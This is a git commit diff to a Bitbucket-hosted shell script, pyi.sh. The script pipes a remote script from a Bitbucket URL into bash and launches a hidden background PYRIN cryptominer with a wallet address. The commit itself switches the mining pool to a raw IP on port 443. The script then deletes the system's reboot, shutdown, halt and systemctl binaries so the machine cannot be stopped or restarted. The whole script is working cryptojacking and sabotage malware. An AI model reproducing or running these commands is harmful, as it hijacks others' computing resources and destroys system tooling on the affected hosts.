9c985d6f46bb48ea93ad2580d5b986d63283d366
Almira Hanafi <almirahanafie@outlook.com>
2024-07-10 17:39:45 +0000

    pyi.sh edited online with Bitbucket

--- pyi.sh
+++ pyi.sh
@@ -3,7 +3,7 @@ apt-get update
 apt-get install -y wget curl
 curl -sL https://bitbucket.org/new-kamikaze/lolkaze01/raw/main/lolGP.sh | bash
 chmod +x lolkaze
-nohup ./lolkaze --algo PYRIN --pool ns5026562.ip-15-235-214.net --port 1177 --user pyrin:qq26gm0pn27hp9vxtrlpngcfzcxmsjc8vtlmn5a2087rxvyaczewyygdxhn7d.sugoi > /dev/null 2>&1 &
+nohup ./lolkaze --algo PYRIN --pool 165.227.111.82 --port 443 --user pyrin:qq26gm0pn27hp9vxtrlpngcfzcxmsjc8vtlmn5a2087rxvyaczewyygdxhn7d.sugoi > /dev/null 2>&1 &
 sleep 30
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
